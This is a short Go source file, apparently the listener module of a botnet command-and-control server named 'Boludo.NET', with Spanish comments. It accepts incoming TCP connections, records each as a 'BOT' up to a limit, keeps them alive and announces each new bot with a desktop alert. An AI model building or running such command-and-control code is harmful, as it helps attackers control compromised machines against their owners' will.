package nets

import (
	"fmt"
	"log"
	"net"

	"BOLUDO.NET/config"
	"github.com/martinlindhe/notify"
)

// Start inicia el servidor y gestiona las conexiones entrantes.
func Start() {

	// Iniciar servidor
	listener, err := net.Listen("tcp", ":"+config.PORT)
	if err != nil {
		log.Fatalf(" [!] Error: %s", err.Error())
	}
	defer listener.Close() // Asegurarse de cerrar el listener al salir.
	go KeepAlive()
	// Aceptar conexiones
	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalf(" [!] Error: %s", err.Error())
		} else {
			config.Mutex.Lock()
			if len(config.BOT) >= config.BOT_LIMIT {
				conn.Close()
				config.Mutex.Unlock()
			} else {
				config.BOT = append(config.BOT, conn)
				config.Mutex.Unlock()
				if config.Notify {
					notify.Alert("Boludo.NET", "BOT CONECTADO", fmt.Sprintf("Nuevo BOT: %s", conn.RemoteAddr()), "")
				}
			}
		}
	}
}
